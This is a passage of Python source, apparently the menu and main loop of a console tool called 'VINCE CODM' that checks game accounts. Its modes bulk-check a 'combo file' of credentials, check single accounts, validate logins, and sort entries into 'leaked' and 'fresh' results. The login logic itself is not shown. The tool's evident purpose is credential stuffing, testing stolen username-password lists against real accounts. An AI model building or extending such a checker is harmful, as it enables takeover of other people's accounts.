        if not selected_file:
            _log('ERROR', 'No file selected.')
            input(f"\n{GRAY}[Press Enter to continue]{RESET} ")
            return
        
        _log('INFO', f'Searching for leaks in: [bold]{Path(selected_file).name}[/bold]')
        result = db.search_leaks(combo_file_path=selected_file)
        
        if result:
            console.print(Panel(
                f"[bold cyan]SEARCH COMPLETE[/bold cyan]\n"
                f"Total: {result['total']:,}\n"
                f"Leaked: [red]{result['leaked']:,}[/red]\n"
                f"Fresh: [green]{result['fresh']:,}[/green]\n\n"
                f"[cyan]Results saved to LeakResults/[/cyan]",
                title="[bold green]LEAK SEARCH COMPLETE[/bold green]",
                border_style="green",
                box=box.ROUNDED
            ))
        else:
            _log('ERROR', 'Search failed or no results.')
        
        input(f"\n{GRAY}[Press Enter to continue]{RESET} ")
        
def display_main_menu():
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.align import Align
    from rich import box
    
    console = Console()
    
    table = Table(box=box.ROUNDED, expand=True, border_style="cyan")
    table.add_column("NO.", justify="center", style="bold yellow", width=8)
    table.add_column("MODE", style="bold white")
    table.add_column("DESCRIPTION", style="dim")
    
    menu_items = [
        ("[bold cyan]1[/bold cyan]", "[bold white]Bulk Check[/bold white]", "[green]Scan a combo file[/green]"),
        ("[bold magenta]2[/bold magenta]", "[bold white]Single Check[/bold white]", "[yellow]Check one account[/yellow]"),
        ("[bold yellow]3[/bold yellow]", "[bold white]Validator[/bold white]", "[cyan]Login-only, no game data[/cyan]"),
        ("[bold red]4[/bold red]", "[bold red]Leak Searcher[/bold red]", "[red]Check if accounts are leaked[/red]")
    ]
    
    for no, mode, desc in menu_items:
        table.add_row(no, mode, desc)
    
    panel = Panel(table, title="[bold cyan]SELECT MODE[/bold cyan]", subtitle="[bold green]VINCE CODM[/bold green]", 
                  border_style="cyan", padding=(1,2))
    
    console.print()
    console.print(Align.center(panel))
    console.print()
    
    while True:
        try:
            choice = input("  Select ➤ ").strip()
            if choice in ("1", "2", "3", "4"):
                return choice
            console.print("[bold red]Enter 1, 2, 3, or 4 only.[/bold red]")
        except KeyboardInterrupt:
            return "3"

def main():
    while True:
        clear_screen()
        display_banner()
        choice = display_main_menu()
        if choice == '1':
            bulk_check()
        elif choice == '2':
            single_check()
        elif choice == '3':
            validator_check()
        elif choice == '4':
            leak_searcher_menu()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n  {YELLOW}⚠  Script terminated by user.{RESET}\n')
    except Exception as e:
        import traceback
        print(f'\n  {RED}✖  Unexpected error: {e}{RESET}')
        traceback.print_exc()